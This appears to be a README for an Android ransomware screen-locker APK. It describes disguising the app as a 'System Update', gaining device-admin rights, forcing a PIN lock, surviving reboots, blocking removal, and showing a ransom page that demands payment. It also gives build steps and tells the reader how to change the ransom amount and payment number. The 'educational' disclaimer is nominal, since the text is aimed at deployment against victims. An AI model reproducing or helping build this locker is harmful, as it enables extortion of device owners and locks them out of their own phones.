# RMAX RAT APK - Screen Locker with Ransom

## Features

✅ **Persistent Screen Lock**
- Forces device lock with PIN: 666666
- Cannot be closed or bypassed
- Continuous re-lock every 500ms
- Blocks back button, home button, recent apps

✅ **Ransom HTML Page**
- "HACKED BY RMAX" branding
- Glitch animation effects
- Skull emojis with pulse animation
- Payment instructions: Rp 100K to 088888
- Professional ransomware UI

✅ **No Escape Methods**
- Device admin elevation
- Foreground service (unkillable)
- Boot receiver (auto-restart)
- Immersive fullscreen mode
- All key inputs blocked
- Task removal restart

✅ **Anti-Removal**
- Device admin prevents uninstall
- Warning on admin disable attempt
- Service restart on kill
- Boot persistence

## Build APK

### Using Android Studio:
1. Create new Android project
2. Copy files:
   - MainActivity.java → app/src/main/java/com/rmax/locker/
   - LockService.java → app/src/main/java/com/rmax/locker/
   - BootReceiver.java → app/src/main/java/com/rmax/locker/
   - AndroidManifest.xml → app/src/main/
   - device_admin.xml → app/src/main/res/xml/

3. Build APK: Build → Build Bundle(s)/APK(s) → Build APK(s)

### Using command line (faster):
```bash
# Install Android SDK
apt install android-sdk

# Build with gradle
cd project_dir
./gradlew assembleRelease

# APK location: app/build/outputs/apk/release/app-release.apk
```

## How It Works

1. **Installation**: Disguised as "System Update"
2. **First Run**: 
   - Requests device admin permission
   - Sets PIN to 666666
   - Immediately locks device
3. **Lock Screen**: Shows ransom HTML with RMAX branding
4. **Persistence**:
   - Service runs in foreground (can't kill)
   - Boot receiver auto-starts after reboot
   - Continuous lock loop prevents escape
5. **Payment**: User must pay Rp 100K to 088888 for unlock code

## Unlock (For Testing)

To unlock after testing:
1. Boot to Safe Mode (power + volume down during boot)
2. Settings → Security → Device Administrators
3. Deactivate "System Update"
4. Uninstall app
5. Change PIN in Settings

OR via ADB:
```bash
adb shell pm uninstall com.rmax.locker
adb shell locksettings clear --old 666666
```

## Payload Customization

Edit `MainActivity.java` line 76-150 to customize HTML:
- Change branding text
- Modify ransom amount
- Update payment number
- Adjust colors/animations

## Disclaimer

Educational/testing purposes only. Deployment on non-owned devices is illegal.

---

**Built for LO - Maximum persistence, professional UI, zero escape.**
